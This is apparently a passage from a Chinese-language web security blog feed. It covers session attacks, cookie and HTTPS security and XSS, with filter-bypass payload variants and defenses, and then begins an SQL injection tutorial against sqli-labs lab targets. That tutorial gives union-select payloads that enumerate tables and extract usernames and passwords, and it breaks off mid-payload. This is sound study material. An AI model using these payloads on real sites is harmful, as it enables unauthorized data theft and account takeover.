aria-hidden="true">image-20231109104742456</figcaption></figure><p><strong>优点：</strong></p><ul><li><strong>支持跨域访问</strong>:Cookie是不支持跨域访问的，Token支持</li><li>无状态:Token无状态，Session有状态(有状态和无状态最大的区别就是服务端会不会保存客户端的信息）</li><li>支持移动设备:Token更适用于移动应用，Cookie不支持手机端访问</li></ul><p><strong>缺点：</strong></p><ul><li>占带宽:正常情况下Token要比sessionID更大，需要消耗更多的流量，挤占更多带宽</li><li>无法在服务端注销，很难解决劫持问题</li></ul><h2 id="web会话管理安全问题">1.3 Web会话管理安全问题</h2><ul><li>三种会话管理方式的凭证本身是比较安全的</li><li>采用HTTPS提高安全性</li></ul><h1 id="session攻击">2. Session攻击</h1><h2 id="session攻击简介">2.1 session攻击简介</h2><ul><li>预测</li><li>捕获(劫持)</li><li>固定</li></ul><h2 id="会话预测">2.2 会话预测</h2><p>会话预测这种方式需要攻击者猜测出系统中使用的有效的Ssession标识符（PHP中格式为PHPSESSID=1234），类似暴力破解。目前会话预测这种攻击方式基本上不太可能成功。</p><h2 id="会话劫持">2.3 会话劫持</h2><p><strong>攻击流程：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731094.png"alt="image-20231109110520149" /><figcaption aria-hidden="true">image-20231109110520149</figcaption></figure><p><strong>获取Session ID：</strong></p><ul><li>暴力破解:尝试各种Session ID，直到破解为止</li><li>预测:如果SessionID使用非随机的方式产生，那么就有可能计算出来</li><li>窃取:使用网络嗅探、XSS攻击等方法获得</li></ul><p><strong>防御方法：</strong></p><ul><li>更改Session名称</li><li>关闭透明化Session ID:透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，SessionID则使用URL来传递。</li><li>设置HttpOnly</li><li>验证HTTP头部信息</li><li>窃取SessionID的方式大多通过攻击网络数据通讯层获取，使用SSL可以防御</li></ul><p><strong>中间人攻击：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731095.png"alt="image-20231109111139852" /><figcaption aria-hidden="true">image-20231109111139852</figcaption></figure><ul><li>中间人攻击(Man-in-the-MiddleAtack，简称“MITM攻击”）是—种通过窃取或篡改通信物理、逻辑链路间接完成攻击行为的网络攻击方法。攻击者与通信的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，实际上整个会话都被攻击者完全控制。这个被攻击者控制的通信节点就是所谓的“中间人“。</li><li>常见类型：<ul><li>基于监听的信息窃取</li><li>基于监听的身份冒认</li></ul></li></ul><h2 id="会话固定">2.4 会话固定</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731096.png"alt="image-20231109111413841" /><figcaption aria-hidden="true">image-20231109111413841</figcaption></figure><ul><li>会话固定也可以看成是会话劫持的一种类型，因为会话固定攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</li><li>重置Session ID的方式：<ul><li>使用客户端脚本来设置Cookie到浏览器</li><li>使用HTML的<code>&lt;META&gt;</code>标签加Set-Cookie属性.与客户端脚本相比，对<code>&lt;META&gt;</code>标签的处理目前还不能被浏览器禁止.</li><li>使用Set-Cookie的HTTP响应头部设置Cookie</li></ul></li><li>防御方法：<ul><li>每当用户登陆的时候就进行重置Session ID</li><li>Session ID闲置过久时，进行重置Session ID</li><li>大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化SessionID，User-Agent验证，Token校验等。</li></ul></li></ul><h1 id="cookie安全">3. Cookie安全</h1><h2 id="cookie机制">3.1 Cookie机制</h2><p><strong>Cookie重要字段：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731097.png"alt="image-20231109112543427" /><figcaption aria-hidden="true">image-20231109112543427</figcaption></figure><p><strong>子域Cookie机制：</strong></p><p>Domain字段，设置cookie时，如果不指定则默认是本域。</p><p><strong>路径Cookie机制：</strong>path字段，设置cookie时，如不指定则默认是当前页面路径。</p><p><strong>HttpOnly Cookie机制：</strong></p><p>用于告诉浏览器不要向客户端脚本暴露Cookie。指仅在HTTP层面上传输Cookie，当设置了HttpOnly属性后，客户端脚本就无法读写该Cookie，能<strong>有效的防御XSS攻击</strong>获取Cookie。</p><p><strong>Secure Cookie机制：</strong></p><p>SecureCookie机制指的是设置了Secure标志的Cookie仅在<strong>HTTPS</strong>层面上安全传输，如果请求是HTTP的就不会带上这个Cookie，这样能降低重要的Cookie被中间人截获的风险。</p><h2 id="cookie存储">3.2 Cookie存储</h2><p><strong>本地Cookie与内存Cookie：</strong></p><p>如果没设置过期时间，则是内存Cookie，这样的Cookie会随着浏览器关闭而从内存中消失;如果设置了过期时间，那么就是本地Cookie，这样的Cookie就会以文本形式保存在操作系统本地，待过期时间到了才会消失。</p><p><strong>安全性：</strong></p><p>不存在谁的安全性更高</p><h1 id="http协议安全">4. HTTP协议安全</h1><h2 id="weak-session-ids">4.1 Weak Session IDs</h2><ul><li>Session利用的实质:由于SessionlD是用户登录之后持有的唯—认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如XSS、文件上传等等。</li><li>弱会话ID：容易被攻击者预测</li></ul><h2 id="http协议安全问题">4.2 HTTP协议安全问题</h2><ul><li>通讯使用明文，未加密，并且TCP/IP协议是可能会被窃听的网络，所以通讯内容可能会被窃听</li><li>没有验证通讯方的身份，可能会被冒充</li><li>没有办法验证报文的完整性，可能会被篡改</li></ul><h2 id="https协议">4.3 HTTPS协议</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731098.png"alt="image-20231109140248365" /><figcaption aria-hidden="true">image-20231109140248365</figcaption></figure><p><strong>SSL/TLS协议：</strong></p><ul><li>所有的信息都是加密传输，第三方无法窃听</li><li>配备身份证书，防止被冒充</li><li>具有校验机制，一旦被篡改，通信双方立马发现</li></ul><p><strong>HTTPS协议：</strong></p><p>超文本传输安全协议(HyperText TransferProtocolSecure，缩写HTTPS;常称为HTTP over TLS、HTTP over SSL或HTTPSecure），是一种通过计算机网络进行安全通信的传输协议，简单来说是HTTP的安全版。</p><p><strong>SSL协议组成：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221531342.png"alt="image-20231122153107895" /><figcaption aria-hidden="true">image-20231122153107895</figcaption></figure><ul><li>记录协议（Record Protocol）：为高层协议提供基本的安全服务。</li><li>握手协议(HandshakeProtocol)：协调客户和服务器的状态，使双方能够达到状态的同步</li><li>警告协议(Alert Protocol)</li><li>密码规范改变协议（Change Cipher Protocol)</li></ul><p><strong>HTTPS通信过程：</strong> <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731099.png"alt="image-20231109140631323" /></p><p><strong>HTTPS缺点：</strong></p><ul><li>对数据进行加解密决定了HTTPS比HTTP慢，相同网络环境下，使用HTTPS协议会使页面的加载时间延长近50%，增加10%-20%的耗电</li><li>HTTPS协议的安全是有范围的，在黑客攻击、拒绝服务攻击、服务器劫持几乎起不到什么作用</li><li>SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行</li><li>SSL证书需要购买，功能越强大的证书费用越高。小网站可选择入门级免费证</li><li>SSL证书通常需要绑定IP，为服务器增加固定IP会增加一定费用</li><li>HTTPS连接服务器端资源占用高很多，支持访客稍多的网站需要投入更大的成本</li><li>HTTPS连接缓存不如HTTP高效，流量成本太高</li></ul><h1 id="xss跨站脚本攻击">5. XSS跨站脚本攻击</h1><h2 id="xss漏洞概述">5.1 XSS漏洞概述</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731100.png"alt="image-20231109141424937" /><figcaption aria-hidden="true">image-20231109141424937</figcaption></figure><ul><li><p>XSS被称为跨站脚本攻击（CrosS-sitescripting），由于和CSS（Cascading StyleSheets）重名，所以改为XSS。</p></li><li><p>XSS主要基于javascript语言完成恶意的攻击行为，因为javascript可以非常灵活的操作html、css和浏览器。</p></li><li><p>XSS攻击的对象是用户浏览器，属于<strong>被动攻击</strong>。</p></li><li><p>实施XSS攻击需要具备的两个条件:</p><ul><li>需要向Web页面注入精心构造的恶意代码</li><li>对用户的输入<strong>没有做过滤</strong>，恶意代码能够被浏览器成功的执行</li></ul></li><li><p>危害：</p><ul><li>盗取各种用户账号</li><li>窃取用户Cookie资料，冒充用户身份进入网站</li><li>劫持用户会话，执行任意操作</li><li>刷流量，执行弹窗广告</li><li>传播蠕虫病毒</li><li>攻击者能在一定限度内记录用户的键盘输入</li></ul></li><li><p>XSS验证（弹窗）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"># 构造弹窗的代码提交，浏览器在执行该代码后就会执行弹框的操作，弹框的目的是验证提交的JS代码是否被执行，从而验证XSS漏洞是否存在。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;你的电脑中病毒了&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="xss漏洞分类">5.2 XSS漏洞分类</h2><h3 id="反射型xss">5.2.1 反射型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731101.png"alt="image-20231109142051057" /><figcaption aria-hidden="true">image-20231109142051057</figcaption></figure><ul><li>反射型XSS又称为非持久型XSS，是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。</li><li>特点：<ul><li><strong>非持久性</strong></li><li>参数型脚本</li><li>反射型XSS的JS代码在Web应用的参数(变量）中，如搜索框等地方</li></ul></li><li>数据流量走向:浏览器-&gt; 后端-&gt;浏览器</li><li>实际利用中可结合短网址</li></ul><h3 id="存储型xss">5.2.2 存储型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731102.png"alt="image-20231109142349933" /><figcaption aria-hidden="true">image-20231109142349933</figcaption></figure><ul><li>存储型XSS又叫持久型XSS。一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</li><li>特点:<ul><li><strong>持久性</strong></li><li>持久性体现在JS代码不是在某个参数(变量）中，而是写进数据库或文件等可以永久保存数据的介质中，如留言板等地方</li></ul></li><li>数据流量走向:浏览器-&gt; 后端-&gt;数据库-&gt;后端-&gt;浏览器</li></ul><h3 id="dom型xss">5.2.3 DOM型XSS</h3><ul><li><p>DOM树</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731103.png"alt="image-20231109142624025" /><figcaption aria-hidden="true">image-20231109142624025</figcaption></figure></li><li><p>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种:</p><ul><li>元素节点：<code>&lt;body&gt;</code>、<code>&lt;p&gt;</code></li><li>文本节点</li><li>属性节点</li></ul></li><li><p>D0M型XSS漏洞是基于文档对象模型（Document ObjectModel)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，<strong>它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析</strong>。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如<code>document.qetElementByld("×").innerHTML</code>、<code>document.write</code>等。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731104.png"alt="image-20231109143118310" /><figcaption aria-hidden="true">image-20231109143118310</figcaption></figure></li><li><p>特点：<strong>非持久性</strong></p></li><li><p>数据流量走向：URL -&gt; 浏览器</p></li></ul><h2 id="xss-payload构造以及变形">5.3 XSS payload构造以及变形</h2><h3 id="构造">5.3.1 构造</h3><ul><li>利用<code>&lt;&gt;</code>构造HTML标签和<code>&lt;script&gt;&lt;/Script&gt;</code>标签</li><li>利用HTML标签的属性值(伪协议）<code>&lt;a href="javascript:alert(/xss/)"&gt;touch me!&lt;/a&gt;</code></li><li>利用事件<ul><li>windows事件：对windows 对象触发的事件</li><li>Form 事件：HTML 表单内的动作触发事件</li><li>Keyboard 事件：键盘按键</li><li>Mouse 事件：由鼠标或类似用户动作触发的事件</li><li>Media 事件：由多媒体触发的事件</li><li><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></li></ul></li><li>利用CSS（基本不适合现在主流浏览器）</li></ul><h3 id="变形">5.3.2 变形</h3><p>Web网站在对用户输入进行过滤，但是过滤不严格时，可以构造各种不同的Payload以及对XSS的Payload进行变形，使其绕过过滤机制，使网站弹框，从而挖掘XSS漏洞。</p><ul><li>大小写</li><li>双写关键字<code>&lt;scrscriptipt&gt;alert(xss)&lt;/scrscriptipt&gt;</code></li><li>引号：如果在HTML标签中，可以不用引号；如果在js中，可以用反引号代替单双引号<code>&lt;img src="#" onerror="alert(/xss/)"/&gt;</code></li><li><code>/</code>代替空格</li><li>Tab与回车：在一些位置添加Tab（水平制表符）和回车符来绕过关键字检测</li><li>编码：HTML实体编码、URL编码</li></ul><h1 id="cookie攻击">6. Cookie攻击</h1><h2 id="cookie基础">6.1 Cookie基础</h2><ul><li>Cookie是用户浏览网页时网站<strong>存储在用户机器上</strong>的小文本文件。</li><li>主要记录与用户相关的一些状态或者设置，比如用户名、ID、访问次数等。当用户下一次访问这个网站的时候，网站会先访问用户机器上对应的该网站的Cookie文件。</li><li>特性：<ul><li>同一个网站中所有的页面共享一套Cookie</li><li>大小限制</li><li>过期时间</li></ul></li><li>作用：<ul><li>Cookie最大作用维持会话的凭证</li><li>减少登录网站的次数</li><li>记录关于用户信息</li></ul></li><li>类型：<ul><li>持久型Cookie以文本形式存储在硬盘上，由浏览器存取</li><li>临时型Cookie也称为会话Cookie，存储在内存中，关闭当前浏览器后会立即消失</li></ul></li><li>浏览器通过Document对象访问Cookie</li></ul><h2 id="cookie攻击-1">6.2 Cookie攻击</h2><p><strong>类型：</strong></p><ul><li>直接访问Cookie文件查找想要的机密信息;</li><li>在客户端和服务端进行Cookie信息传递的时候进行窃取，从而冒充合法用户操作;</li><li>攻击者修改Cookie信息，所以在服务端接收到客户端获取的Cookie信息的时候，就会对攻击者伪造过的Cookie信息操作。</li></ul><p><strong>获取Cookie信息的主要途径：</strong></p><ul><li>直接读取磁盘的Cookie文件;</li><li>使用网络嗅探器来获取网络上传输的Cookie;</li><li>使用Cookie管理工具获取内存或文件系统中的Cookie;</li><li>使用跨站脚本盗取Cookie。</li></ul><p><strong>相关函数：</strong></p><ul><li><code>fopen("cookie.txt,"a")</code>：以写入方式打开cookie.txt</li><li><code>fwrite($log, $cookie."\n")</code>：将<code>$cookie</code>变量的内容写入文件指针<code>$log</code>处</li><li><code>fclose($log)</code>：关闭已经打开的<code>$log</code>指针</li></ul><h2 id="xss钓鱼攻击">6.3 XSS钓鱼攻击</h2><ul><li>XSS重定向钓鱼(XSS RedirectPhishing)：将正常用户访问重定向到恶意网站，将恶意网站伪造的和正常访问的网站一样。</li><li>HTML注入式钓鱼(XSS HTML lnjectPhishing）：HTML注入式钓鱼是指直接利用XSS漏洞注入HTML或JavaScript代码到页面中。</li><li>iframe钓鱼：iframe钓鱼是通过标签嵌入远程域的一个页面实施钓鱼。</li><li>高级钓鱼技术：注入代码劫持HTML表单、使用JavaScript编写键盘记录器等。</li></ul><h1 id="xss-worm">7. XSS Worm</h1><h2 id="介绍">7.1 介绍</h2><ul><li><p>所谓的跨站脚本蠕虫(XSSWorm），实质上是一段<strong>脚本程序</strong>，通常用JavaScript或Vbscript写成，在用户浏览XSS页面时被激活。蠕虫利用站点页面的XSS漏洞根据其特定规则进行传播和感染。</p></li><li><p>攻击流程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731105.png"alt="image-20231109150444650" /><figcaption aria-hidden="true">image-20231109150444650</figcaption></figure></li></ul><h2 id="剖析">7.2 剖析</h2><ul><li>寻找XSS点</li><li>实现蠕虫行为</li><li>收集蠕虫数据</li><li>传播与感染</li></ul><p><strong>DOM技术：</strong></p><ul><li>访问元素<ul><li><code>document.getElementByld(“div1”)</code></li><li><code>document.getElementByname</code></li><li><code>document.getElementByTagName</code></li></ul></li><li>所有的DOM元素无外乎分为两种:<strong>文本和元素</strong>。使用<code>innerHTML</code>属性就可以从一个元素中提取所有的HTML和文本。</li><li><code>innerHTML</code>方法还可以向HTML DOM中插入新内容</li></ul><h1 id="xss攻击防御">8. XSS攻击防御</h1><h2 id="xss-filter">8.1 XSS Filter</h2><p>XSSFilter的作用是通过<strong>正则</strong>的方式对用户(客户端）请求的参数做脚本的过滤，从而达到防范XSS攻击的效果。</p><h2 id="过滤方法">8.2 过滤方法</h2><ul><li><p><strong>输入验证</strong>：输入验证是对输入数据使用强类型检查，验证数据的类型、长度、格式、范围等。</p></li><li><p><strong>数据净化</strong>：数据净化是为了使有潜在危害的数据变得安全。如果所允许的输入范围不能保证输入数据的安全性，数据净化就非常有用。<strong>数据净化包括从删除用户输入字符串后面的空格到去除值等一切行为。</strong>在Web 应用程序中，常见的数据净化示例是<strong>使用 URL 编码或HTML编码来包装数据，并将其作为文本而不是可执行脚本来处理</strong>。</p></li><li><p><strong>输出编码</strong>：当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS，特殊字符(如&lt;&gt;&amp;'“等），为了确保输出内容的完整性和正确性，可以使用编码<code>HTMLEncode</code>进行处理。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731106.png"alt="image-20231109154200235" /><figcaption aria-hidden="true">image-20231109154200235</figcaption></figure></li></ul><h2 id="web安全编码规范">8.3 Web安全编码规范</h2><p>核心思想：将未信任数据嵌入到任何输出之前都应按照上下文的转义规则对其进行编码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731107.png"alt="image-20231109155204593" /><figcaption aria-hidden="true">image-20231109155204593</figcaption></figure><h1 id="xss相关工具及使用">9. XSS相关工具及使用</h1><ul><li>Burp：抓包，然后右键选择<code>Do an active scan</code></li><li>XSS测试平台：是测试XSS漏洞获取Cookie并接受Web页面的平台，可以窃取Cookie、后台增删改文章、钓鱼、修改网页代码等，源码基于xsser.me。</li><li>BruteXSS是跨站点脚本暴力注入的工具，误报量低。</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/01/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入漏洞">0. SQL注入漏洞</h1><h2 id="漏洞原理">0.1 漏洞原理</h2><p>未经充分验证和过滤的用户输入数据被直接拼接到SQL查询中，导致攻击者能够插入恶意SQL代码执行未经授权的数据库操作。</p><h2 id="分类">0.2 分类</h2><h3 id="按注入点类型分类">0.2.1 按注入点类型分类</h3><h4 id="数字型注入">0.2.1.1 数字型注入</h4><p><strong>原理：</strong></p><p>输入的参数为整数，如ID、年龄、页码等，如果存在注入型漏洞，则为数字型 (整型）注入。</p><p>例：<code>http:/www.testweb.com/user.php?id=8</code>，实际查询代码原型诸如:<code>select…from…where id=$id…</code></p><p><strong>测试方法：</strong></p><table><thead><tr class="header"><th>payload</th><th>返回结果</th></tr></thead><tbody><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1'</td><td>返回错误</td></tr><tr class="even"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1</td><td>运行正常</td></tr><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2</td><td>运行异常</td></tr></tbody></table><h4 id="字符型注入">0.2.1.2 字符型注入</h4><p><strong>原理：</strong></p><p>输入的参数为字符串，与数字型注入的区别在于:字符型注入一般要使用单引号来闭合。</p><p>例：<code>http://www.testweb.com/test.php?user=admin</code>，实际查询代码原型诸如:<code>select…from…where id='$id'….</code></p><p><strong>测试方法：</strong></p><table><thead><tr class="header"><th>payload</th><th>返回结果</th></tr></thead><tbody><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1'</td><td>返回错误</td></tr><tr class="even"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1' and '1'='1</td><td>运行正常</td></tr><tr class="odd"><td>http://[靶机IP]/sqli-labs/Less-1/?id=1' and '1'='2</td><td>运行异常</td></tr></tbody></table><h4 id="搜索型注入">0.2.1.3 搜索型注入</h4><ul><li>这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“Keyword=关键字”，有的不显示链接地址，而是直接通过搜索框表单提交。</li><li>此类注入点提交的 SQL 语句，其原型大致为:<code>select * from 表名 where 字段 like ‘%关键字%'</code></li><li>当我们提交注入参数为<code>keyword='and[查询条件] and %'='</code>，则向数据库提交的SQL语句为:<code>select * from 表名 where 字段 like '%' and [查询条件] and '%'='%'</code></li></ul><h3 id="按注入技术分类">0.2.2 按注入技术分类</h3><ul><li>基于布尔的盲注：可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</li><li>基于报错的注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>联合查询注入：可以使用union的情况下的注入</li><li>堆查询注入：同时执行多条语句的注入</li></ul><h2 id="sql基础">0.3 SQL基础</h2><p><strong>常用注释符：</strong></p><ul><li><code>#</code></li><li><code>--</code></li></ul><p><strong>information_schema数据库（MySQL5.5以上自带）:</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221515692.png"alt="image-20231101161612604" /><figcaption aria-hidden="true">image-20231101161612604</figcaption></figure><p><strong>各数据库在字符串处理时的区别：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221455568.png"alt="image-20231122145512407" /><figcaption aria-hidden="true">image-20231122145512407</figcaption></figure><h2 id="基本注入流程">0.4 基本注入流程</h2><ol type="1"><li>判断是否存在注入点;</li><li>判断字段长度(字段数）;</li><li>判断字段回显位置;</li><li>判断数据库信息;</li><li>查找数据库名;</li><li>查找数据库表;</li><li>查找数据库表中所有字段以及字段值;</li><li>猜解账号密码;</li><li>登录管理员后台。</li></ol><h1 id="基于联合查询的注入">1. 基于联合查询的注入</h1><h2 id="基于联合查询的数字型get注入">1.1基于联合查询的数字型GET注入</h2><h3 id="原理">1.1.1 原理</h3><p>数字型GET注入，其注入点存在于URL中的GET参数处，如<code>http://www.testweb.com/user.php?id=8</code>，而服务器后端实际查询代码原型诸如：<code>select … from … where id=$id…</code>。攻击者可以通过构造恶意的GET输入参数，利用unionselect命令进行注入，暴露数据库中存储的信息。</p><h3 id="注入过程">1.2.1 注入过程</h3><ol type="1"><li><p>寻找注入点，判断注入类型</p></li><li><p>获取网站查询的字段数（关键字order by）</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//--+作用：注释掉后面语句（也可用编码后的#，为%23）</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 order by 3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>判断网站的回显位置</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,database()--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="基于联合查询的字符型get注入">1.2基于联合查询的字符型GET注入</h2><h3 id="原理-1">1.2.1 原理</h3><p>字符型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：<code>select … from … where id=’$id’…</code>。攻击者可以通过构造恶意的GET输入参数，利用unionselect命令进行注入，暴露数据库中存储的信息。<strong>与数字型注入的区别在于:字符型注入一般需要单引号来闭合.</strong></p><h3 id="注入过程-1">1.2.2 注入过程</h3><ol type="1"><li><p>寻找注入点，判断注入类型</p></li><li><p>获取网站查询的字段数（关键字order by）</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;<span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; order by 3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>判断网站的回显位置</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,3--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,database()--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=<span 